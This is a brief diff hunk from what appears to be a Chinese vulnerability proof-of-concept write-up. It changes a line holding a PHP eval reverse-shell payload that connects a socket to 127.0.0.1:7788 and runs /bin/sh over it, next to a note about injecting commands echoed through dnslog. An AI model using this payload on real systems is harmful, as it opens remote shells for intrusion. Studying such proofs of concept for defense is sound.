@@ -38,7 +38,7 @@ Accept-Language: zh_CN
 POC/EXP：添加恶意命令（此处用dnslog回显命令）
 
 ```
-反弹shell语句是：eval('$s=stream_socket_client("tcp://127.0.0.1:7788");proc_open("/bin/sh -i", array(0=>$s,1=>$s,2=>$s),$p);'); 
+反弹shell语句是：eval('$s=stream_socket_client("tcp://127.0.0.1:7788");proc_open("/bin/sh -i", array(0=>$s,1=>$s,2=>$s),$p);'); 
 ```
 
 ```
